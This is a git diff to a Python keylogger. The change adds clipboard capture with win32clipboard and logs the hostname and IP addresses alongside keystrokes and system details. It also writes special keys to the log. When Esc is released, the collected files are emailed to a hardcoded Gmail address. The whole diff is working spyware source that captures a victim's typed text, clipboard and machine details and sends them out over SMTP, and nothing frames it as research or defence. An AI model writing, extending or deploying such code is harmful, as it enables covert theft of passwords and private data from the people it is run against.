@@ -12,8 +12,11 @@ import smtplib
 import socket
 import platform
 
+import win32clipboard
+
 keys_information = "key_log.txt"
 sys_information = "sys_info.txt"
+clipboard_information = "clip_info.txt"
 
 from_addr = "tharilaki82@gmail.com"
 toaddress = "tharilaki82@gmail.com"
@@ -64,7 +67,8 @@ def system_info():
             f.write("Public IP Address : "+public_IP)
         except Exception:
             f.write("Couldn't get public IP Address\n")
-        f.write("Local IP Address : "+IPAddress+"\n")
+        f.write("Host Name : "+hostname+"\n")
+        f.write("Private IP Address : "+IPAddress+"\n")
         f.write("Processor info : "+platform.processor()+"\n")
         f.write("System info : " + platform.system() + "\n")
         f.write("Version info : " + platform.version() + "\n")
@@ -74,6 +78,19 @@ def system_info():
 
 system_info()
 
+def clipboard_info():
+    with open(path + extend + clipboard_information, "a") as f:
+        try:
+            win32clipboard.OpenClipboard()
+            f.write(win32clipboard.GetClipboardData())
+        except Exception:
+            f.write("Can't get clipboard data\n")
+
+        win32clipboard.CloseClipboard()
+
+
+
+
 def press(key):
     global keys
     keys.append(key)
@@ -81,6 +98,7 @@ def press(key):
     keys =[]
 def release(key):
     if key == Key.esc:
+        clipboard_info()
         send_email(keys_information, path + extend + keys_information, toaddress)
         send_email(sys_information, path + extend + sys_information, toaddress)
         return False
@@ -92,10 +110,11 @@ def write_file(keys):
                 f.write('\n')
             elif hasattr(key, 'char'):
                 f.write(key.char)
+            else:
+                f.write("["+str(key)+"]\n")
 
 
 
 with Listener(on_press=press, on_release=release) as listener:
     listener.join()
 
-#hi
